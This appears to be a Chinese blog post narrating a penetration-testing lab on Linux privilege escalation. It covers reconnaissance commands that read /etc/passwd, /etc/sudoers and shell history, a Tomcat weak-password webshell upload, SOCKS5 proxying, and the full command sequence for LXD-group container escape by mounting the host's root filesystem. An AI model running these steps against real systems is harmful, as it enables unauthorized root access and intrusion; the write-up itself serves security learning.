# 内网渗透 linux提权

<br>

## 信息收集

<br>

**1、内核，操作系统和设备信息**

````
uname -a  打印所有可用的系统信息
uname -r  内核版本
uname -n  系统主机名。
uname -m  查看系统内核架构（64位/32位）
hostname  系统主机名
lsb_release -a   发行版信息
cat /proc/version  内核信息
cat /etc/*-release  发行版信息
cat /etc/issue    发行版信息
cat /proc/cpuinfo  CPU信息
````

<br>

**2、用户和群组**

````
cat /etc/passwd     列出系统上的所有用户
cat /etc/group      列出系统上的所有组
groups              当前用户所在的组
groups test         test用户所在的组
getent group xxx      xxx组里的用户
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'      列出所有的超级用户账户
whoami              查看当前用户
w                   谁目前已登录，他们正在做什么
last                最后登录用户的列表
lastlog             所有用户上次登录的信息
lastlog –u %username%  有关指定用户上次登录的信息
````

看到如**sudo:x:27:yokan**可知**yokan用户在sudo组**里。

<br>

**3、用户和权限信息**

````
whoami        当前用户名
id            当前用户信息
cat /etc/sudoers  谁被允许以root身份执行
sudo -l       当前用户可以以root身份执行操作
````

<br>

**4、环境信息**

````
env        显示环境变量
echo %PATH 路径信息
history    显示当前用户的历史命令记录
pwd        输出工作目录
cat /etc/profile   显示默认系统变量
cat /etc/shells    显示可用的shell
````

<br>

## 实战

<br>

这里以咱们的靶场为例


### 1.突破

<br>

篇幅有限，先不谈。tomcat弱口令上传哥斯拉木马即可

### 2.提权

<br>

<img src="https://54huarui.github.io/blogs/tiquan/1.png" width="880" height="480">

上传fscan后发现权限不足不能运行，没绷住。于是根据经验，我想到另一个办法，用socks5正向代理，再用fscan扫描

兴致勃勃地花了一个小时终于代理进去了，然鹅发现没啥卵用，fscan的sock5功能连不上服务器，于是放弃。不过作为sock5的链接已经搭好了，我决定还是留着，如果发现了啥内网的东西还能有用

<br>

好在天无绝人之路。查看组，发现我们在一个名叫lxd的组

<img src="https://54huarui.github.io/blogs/tiquan/2.png" width="880" height="480">

<br>

#### lxd提权:

**LXD 是基于 LXC 容器的管理程序，当前用户可操作容器。所以用户可创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。**

按照网上的办法一步步操作

1. **上传alpine-v3.13-x86_64-20210218_0139.tar.gz**
2. **lxc 创建容器并别名为 test**  : lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test
3. **初始化容器 test 并设置选项 security.privileged=true，即允许容器以特权模式运行**  :lxc init test test -c security.privileged=true
4. **将宿主机的根目录 "/" 挂载到容器中的 "/mnt/root" 目录，recursive=true 选项表示在添加设备时递归创建目标路径** :lxc config device add test test disk source=/ path=/mnt/root recursive=true
5. **启动容器 test 并打开一个 shell 会话，可以看到当前权限为容器的 root 权限（注意：不是宿主机的 root 权限）** :lxc start test然后lxc exec test /bin/sh

然鹅，最后一步的获取shell启动失败了，返回null

放弃这条路了

<br>

于是我又把目光转向socks5代理

重新开启代理，链接

<img src="https://54huarui.github.io/blogs/tiquan/5.png" width="880" height="480">

<br>

然后在proxifier配置规则

<img src="https://54huarui.github.io/blogs/tiquan/3.png" width="880" height="480">

<br>

尝试链接127.0.0.1:8080端口，正向代理成功

<img src="https://54huarui.github.io/blogs/tiquan/4.png" width="880" height="480">